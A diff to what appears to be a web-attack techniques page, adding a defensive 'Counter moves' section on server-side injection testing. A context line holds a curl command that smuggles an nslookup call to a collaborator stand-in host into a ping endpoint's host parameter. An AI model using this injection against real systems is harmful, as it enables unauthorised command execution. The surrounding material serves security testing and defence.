@@ -189,3 +189,7 @@ curl "https://target.com/api/ping?host=;nslookup+YOUR_COLLABORATOR_PAYLOAD"
 - [SSRF](../techniques/ssrf.md)
 - [SSTI](../techniques/ssti.md)
 - [XXE injection](../techniques/xxe.md)
+
+## Counter moves
+
+Runbook: Server-side injection testing is the case here. The durable answers are server-side validation, authorisation, and dependency hygiene. Defenders' notes on this are under [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
